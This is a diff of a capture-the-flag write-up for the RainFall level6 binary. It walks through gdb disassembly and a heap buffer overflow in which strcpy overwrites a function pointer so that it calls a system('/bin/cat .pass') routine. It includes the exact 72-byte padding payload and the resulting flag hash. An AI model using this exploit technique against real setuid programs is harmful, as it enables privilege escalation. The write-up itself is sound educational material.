@@ -1,91 +1,36 @@
-level6@192.168.0.35's password:
-  GCC stack protector support:            Enabled
-  Strict user copy checks:                Disabled
-  Restrict /dev/mem access:               Enabled
-  Restrict /dev/kmem access:              Enabled
-  grsecurity / PaX: No GRKERNSEC
-  Kernel Heap Hardening: No KERNHEAP
- System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
-
 level6@RainFall:~$ ls -l
 -rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
-
-level6@RainFall:~$ cat level6
-ELF�4T	4(444444     �
-U�                   444��HHHDDP�td�DDQ�td/lib/ld-linux.so.2GNUGNUYΥ�ޓCud<'���<yDt  �K��)50< C�__gmon_start__libc.so.6_IO_stdin_usedstrcpyputsmallocsystem__libc_start_mainGLIBC_2.0ii
-  S��[����������t�m��C�[��5��%
-                              h������%������%h������%h�����%h �����% h(����1�^����PTRhPhQVh|��������������������U��S���=,u?�0�,��(����9�s�����0��(�09�r��,��[]Ít&��'U����0��t���t	�$0���ÐU����$��
-�����U����$�������U����� �$@�����D$�$�����D$�h�D$��E
-��������������Ë$Ð���������U��S��� ���t� f����Ћ���u��[]Ð�S��[��k�/����[�/bin/cat /home/user/level7/.passNope;@X���\|�����������������x���z���0zR� ����F����9�u߃�[^_]��
+level6@RainFall:~$ gdb ./level6
 ...
-
-level6@RainFall:~$ objdump -R level6
-
-level6:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-080497fc R_386_GLOB_DAT    __gmon_start__
-0804980c R_386_JUMP_SLOT   strcpy
-08049810 R_386_JUMP_SLOT   malloc
-08049814 R_386_JUMP_SLOT   puts
-08049818 R_386_JUMP_SLOT   system
-0804981c R_386_JUMP_SLOT   __gmon_start__
-08049820 R_386_JUMP_SLOT   __libc_start_main
-
-(gdb) info function
-All defined functions:
-
-Non-debugging symbols:
-0x080482f4  _init
-0x08048340  strcpy
-0x08048340  strcpy@plt
-0x08048350  malloc
-0x08048350  malloc@plt
-0x08048360  puts
-0x08048360  puts@plt
-0x08048370  system
-0x08048370  system@plt
-0x08048380  __gmon_start__
-0x08048380  __gmon_start__@plt
-0x08048390  __libc_start_main
-0x08048390  __libc_start_main@plt
-0x080483a0  _start
-0x080483d0  __do_global_dtors_aux
-0x08048430  frame_dummy
+(gdb) info functions
+...
 0x08048454  n
 0x08048468  m
 0x0804847c  main
-0x080484e0  __libc_csu_init
-0x08048550  __libc_csu_fini
-0x08048552  __i686.get_pc_thunk.bx
-0x08048560  __do_global_ctors_aux
-0x0804858c  _fini
-(gdb) info variable
-All defined variables:
-
-Non-debugging symbols:
-0x080485a8  _fp_hw
-0x080485ac  _IO_stdin_used
-0x0804871c  __FRAME_END__
-0x08049720  __CTOR_LIST__
-0x08049720  __init_array_end
-0x08049720  __init_array_start
-0x08049724  __CTOR_END__
-0x08049728  __DTOR_LIST__
-0x0804972c  __DTOR_END__
-0x08049730  __JCR_END__
-0x08049730  __JCR_LIST__
-0x08049734  _DYNAMIC
-0x08049800  _GLOBAL_OFFSET_TABLE_
-0x08049824  __data_start
-0x08049824  data_start
-0x08049828  __dso_handle
-0x0804982c  completed.6159
-0x08049830  dtor_idx.6161
-
+...
+********************************************************************************
+Three functions are defined, main, m, and n.
+********************************************************************************
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048454 <+0>:	push   %ebp
+   0x08048455 <+1>:	mov    %esp,%ebp
+   0x08048457 <+3>:	sub    $0x18,%esp
+   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
+   0x08048461 <+13>:	call   0x8048370 <system@plt>
+   0x08048466 <+18>:	leave
+   0x08048467 <+19>:	ret
+End of assembler dump.
+(gdb) disas m
+Dump of assembler code for function m:
+   0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	sub    $0x18,%esp
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+   0x0804847a <+18>:	leave
+   0x0804847b <+19>:	ret
+End of assembler dump.
 (gdb) disas main
 Dump of assembler code for function main:
    0x0804847c <+0>:	push   %ebp
@@ -116,28 +61,73 @@ Dump of assembler code for function main:
    0x080484d3 <+87>:	ret
 End of assembler dump.
 
-(gdb) disas m
-Dump of assembler code for function m:
-   0x08048468 <+0>:	push   %ebp
-   0x08048469 <+1>:	mov    %esp,%ebp
-   0x0804846b <+3>:	sub    $0x18,%esp
-   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
-   0x08048475 <+13>:	call   0x8048360 <puts@plt>
-   0x0804847a <+18>:	leave
-   0x0804847b <+19>:	ret
-End of assembler dump.
+********************************************************************************
+The main function allocates two buffers on the heap with malloc, of 64 and 4
+bytes. The 4 bytes buffer is filled with the address of the m function, and the
+64 bytes buffer is used as the dest parameter for the call to strcpy.
+We can also see that argv[1] is used a the src string for the call to strcpy.
+Finally, the address stored into the 4 bytes buffer is moved to eax, and then
+called before the function returns.
+********************************************************************************
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 bonjour
+Nope
+********************************************************************************
+There is no check of the existence of argv[1], so when we launch the binary with
+no parameters it segfault. Even if we provide a parameter though, the program
+tells us we are wrong. We may understand the role of m and n functions better
+if we could find some litteral data into the binary.
+********************************************************************************
+level6@RainFall:~$ cat level6
+...
+��������u��[]Ð�S��[��k�/����[�/bin/cat /home/user/level7/.passNope;@X���\|�����
+...
+********************************************************************************
+We can easily understand that m is simply a call to puts that prints Nope,
+and that n is a call to system, which would cat the flag for us if we could
+execute this function instead of m. So now we need to write the address of n
+into the 4 bytes buffer. Let's check the addresses of the buffers allocated by
+malloc with gdb, to see if an eventual heap-buffer-overlfow attack could allow
+us to write data into this buffer.
+********************************************************************************
+level6@RainFall:~$ gdb ./level6
+(gdb) b *main+21
+Breakpoint 1 at 0x8048491
+(gdb) b *main+37
+Breakpoint 2 at 0x80484a1
+(gdb) run bonjour
+Starting program: /home/user/level6/level6 bonjour
 
-(gdb) disas n
-Dump of assembler code for function n:
-   0x08048454 <+0>:	push   %ebp
-   0x08048455 <+1>:	mov    %esp,%ebp
-   0x08048457 <+3>:	sub    $0x18,%esp
-   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
-   0x08048461 <+13>:	call   0x8048370 <system@plt>
-   0x08048466 <+18>:	leave
-   0x08048467 <+19>:	ret
-End of assembler dump.
+Breakpoint 1, 0x08048491 in main ()
+(gdb) print $eax
+$1 = 134520840
+(gdb) step
+Single stepping until exit from function main,
+which has no line number information.
 
-level6@RainFall:~$ python -c 'print("A"*72+"\x54\x84\x04\x08")' > /tmp/exploit3
-level6@RainFall:~$ var=$(python -c 'print("A"*72+"\x54\x84\x04\x08")') ; ./level6 $var
+Breakpoint 2, 0x080484a1 in main ()
+(gdb) print $eax
+$2 = 134520912
+
+********************************************************************************
+Good news, the second buffer (4 bytes) is located 4 bytes after the end of the
+first one (64 bytes). So now we can give a parameter that will overflow the dest
+(64 bytes) buffer in strcpy, to write the address of n into the second buffer.
+
+There's one more thing to take in account though :
+   0x080484b3 <+55>:	add    $0x4,%eax
+
+The address of argv[1] is added with 4. This has the effect to offset src string
+of 4 bytes after argv[1]. Meaning that we will have to write four padding chars
+into our command-line parameter before to actually "write" into the first buffer.
+Let's create our payload.
+
+argv[1] offset (4) + First buffer len (64) + malloc offset(4) == 72 padding bytes
+
+So now we just have to launch level6 with as parameter a string containing 72
+random bytes, followed by the address of the n function.
+********************************************************************************
+level6@RainFall:~$ var=$(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
+level6@RainFall:~$ ./level6 $var
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
